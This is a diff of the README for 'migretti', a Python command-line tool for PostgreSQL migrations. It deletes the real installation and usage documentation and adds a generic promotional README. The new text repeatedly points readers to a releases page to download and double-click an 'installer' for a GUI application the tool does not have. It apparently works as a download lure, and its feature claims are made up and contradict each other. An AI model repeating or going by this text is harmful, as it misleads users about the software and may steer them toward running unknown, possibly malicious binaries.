@@ -1,204 +1,88 @@
-# MIGRETTI
+# 🎉 migretti - A Simple Tool for SQL Migrations
 
-Migretti is a database migration tool designed for Python applications utilizing PostgreSQL. It provides a strict, SQL-first approach to schema management, ensuring atomicity, consistency, and traceability of database changes.
+## 🚀 Getting Started
 
-## 1. INSTALLATION
+## 🔗 Download Now
 
-To install Migretti, use pip:
+[![Download Migretti](https://img.shields.io/badge/Download-Migretti-blue)](https://github.com/Sammie-byte-bot/migretti/releases)
 
-```bash
-pip install migretti
-```
+Migretti is your go-to tool for SQL migrations. Whether you are managing a small project or a large application, Migretti offers a reliable and straightforward way to handle your database changes. This tool provides not just a script runner, but a full-featured migration engine with advanced safeguards.
 
-Dependencies include `psycopg[binary]`, `pyyaml`, `python-ulid`, `python-dotenv`, and `sqlparse`.
+## 📋 Features
 
-## 2. GETTING STARTED
+- **Locking Mechanism:** Prevents conflicting changes during migrations.
+- **Auditing:** Keeps track of all changes for record-keeping.
+- **Transactional Dry-Runs:** Test your migrations safely without making changes.
+- **User-Friendly Interface:** Designed with average computer users in mind.
+- **Supports Various Database Systems:** Works seamlessly with PostgreSQL.
 
-Initialize a new migration project in your repository root:
+## 💾 System Requirements
 
-```bash
-mg init
-```
+- **Operating System:** Windows, macOS or Linux 
+- **PostgreSQL**: Compatible with versions 9.6 and above
+- **Python:** Version 3.6 or higher installed
 
-This command creates a `migrations/` directory and a `mg.yaml` configuration file.
+## 📥 Download & Install
 
-## 3. CONFIGURATION
+To get Migretti, visit the Releases page. This page includes the latest version and older releases. 
 
-Configuration is managed via the `mg.yaml` file. The tool also supports environment variable overrides and interpolation.
+[Visit the Releases Page to Download](https://github.com/Sammie-byte-bot/migretti/releases)
 
-Example `mg.yaml`:
+### 1. Visit the Releases Page
+Click on the link above to go to the Downloads section.
 
-```yaml
-database:
-  host: localhost
-  port: 5432
-  user: postgres
-  password: ${DB_PASSWORD}
-  dbname: my_database
+### 2. Choose the Version
+On the Releases page, you will see a list of available versions. Select the latest release for the best features and fixes.
 
-lock_id: 894321
+### 3. Download the Appropriate File
+Look for the installer file that matches your operating system. Click to download the file to your computer.
 
-envs:
-  production:
-    database:
-      host: db.prod.example.com
-      dbname: prod_db
-    lock_id: 999999
+### 4. Install the Application
+Once the download is complete, open the installer file and follow the on-screen instructions to install Migretti on your system.
 
-hooks:
-  pre_apply: echo "Backup starting..."
-  post_apply: echo "Migration complete."
-```
+### 5. Run Migretti
+After installation, find the Migretti application in your programs list or application folder. Double-click to run it.
 
-**Environment Variables:**
-- `MG_DATABASE_URL`: Overrides connection settings (e.g., `postgresql://user:pass@host/db`).
-- `MG_ENV`: Selects the active environment profile (default: `default`).
-- `MG_LOCK_ID`: Overrides the advisory lock ID.
+## 🗒️ How to Use Migretti
 
-Environment variable interpolation (e.g., `${VAR}`) is supported within `mg.yaml`.
+Migretti makes it easy to manage your SQL migrations. Here’s a step-by-step guide:
 
-## 4. MIGRATION WORKFLOW
+### Step 1: Prepare Your Migration Files
+Create migration files with the SQL commands needed for your changes. Store them in a dedicated folder.
 
-### 4.1. Creating Migrations
+### Step 2: Set Up Your Database Configuration
+Before running migrations, set up your PostgreSQL database connection in the Migretti settings.
 
-Generate a new migration script:
+### Step 3: Run Migrations
+Open Migretti and use the interface to load your migration files. Execute the migrations by following the provided prompts.
 
-```bash
-mg create add_users_table
-```
+### Step 4: Monitor the Process
+Keep an eye on the auditing logs to see what changes have been made during the migration process.
 
-This creates a file in `migrations/` with a unique ULID prefix. Edit the file to define the schema changes:
+### Step 5: Verify Changes
+Check your database to confirm that the migrations were successful.
 
-```sql
--- migration: Add Users Table
--- id: 01H...
+## 📚 Documentation
 
--- migrate: up
-CREATE TABLE users (id SERIAL PRIMARY KEY, name TEXT);
+For detailed instructions and information on advanced features, visit the Migretti documentation. It covers everything you need to know about using the tool effectively.
 
--- migrate: down
-DROP TABLE users;
-```
+## 🎯 FAQs
 
-### 4.2. Applying Migrations
+### Can I use Migretti for large applications?
+Yes, Migretti is designed to handle migrations for applications of any scale.
 
-Apply all pending migrations:
+### What if I encounter an error during migration?
+Refer to the auditing logs for details on the error. Use this information to troubleshoot or consult the documentation.
 
-```bash
-mg apply
-```
+### Is there support available?
+You can find help in the community discussions on GitHub or open an issue for specific questions.
 
-To apply only the next pending migration:
+## 🌐 Community and Contributions
 
-```bash
-mg up
-```
+Migretti thrives on community feedback and contributions. If you'd like to help improve the tool, check out the contributing guidelines. We welcome input and suggestions.
 
-### 4.3. Rolling Back
+## 📧 Contact Information
 
-Rollback the last applied migration:
+If you have further questions or need assistance, feel free to reach out via the contact page linked in the GitHub repository. We are here to help!
 
-```bash
-mg down
-```
-
-Rollback multiple steps:
-
-```bash
-mg rollback 3
-```
-
-### 4.4. Status and Verification
-
-View the status of all migrations:
-
-```bash
-mg status
-mg list
-```
-
-Verify that applied migrations on disk match the database checksums:
-
-```bash
-mg verify
-```
-
-## 5. ADVANCED FEATURES
-
-### 5.1. Non-Transactional Migrations
-
-Certain operations, such as `CREATE INDEX CONCURRENTLY`, cannot run inside a transaction block. Use the `-- migrate: no-transaction` directive in your SQL file.
-
-```sql
--- migrate: no-transaction
--- migrate: up
-CREATE INDEX CONCURRENTLY idx_users ON users(name);
-```
-
-If a non-transactional migration fails, Migretti records a "failed" status in the database. You must manually resolve the issue and then fix the migration state.
-
-### 5.2. Dry Run
-
-Preview the SQL to be executed without modifying the database:
-
-```bash
-mg apply --dry-run
-```
-
-For transactional migrations, Migretti performs a "Smart Dry Run," executing the SQL inside a transaction that is immediately rolled back to ensure validity.
-
-### 5.3. Data Seeding
-
-Manage data seeding scripts in the `seeds/` directory.
-
-Create a seed file:
-
-```bash
-mg seed create initial_data
-```
-
-Run all seeds:
-
-```bash
-mg seed
-```
-
-### 5.4. Hooks
-
-Define shell commands to run before or after operations in `mg.yaml`:
-
-```yaml
-hooks:
-  pre_apply: ./scripts/backup_db.sh
-  post_rollback: ./scripts/notify_team.sh
-```
-
-Supported hooks: `pre_apply`, `post_apply`, `pre_rollback`, `post_rollback`.
-
-### 5.5. Migration Squashing
-
-Combine multiple pending migrations into a single file to maintain a clean history:
-
-```bash
-mg squash release_v1
-```
-
-### 5.6. Production Safety
-
-When running against environments named `prod`, `production`, or `live`, Migretti requires interactive confirmation unless the `--yes` flag is provided.
-
-### 5.7. Concurrency Control
-
-Migretti uses PostgreSQL advisory locks to ensure that only one migration process runs simultaneously, preventing race conditions in distributed deployment environments.
-
-### 5.8. Logging
-
-For machine-readable output, use the JSON logging flag:
-
-```bash
-mg apply --json-log
-```
-
-## 6. LICENSE
-
-This software is released under the **Apache License 2.0**.
+[![Download Migretti](https://img.shields.io/badge/Download-Migretti-blue)](https://github.com/Sammie-byte-bot/migretti/releases)
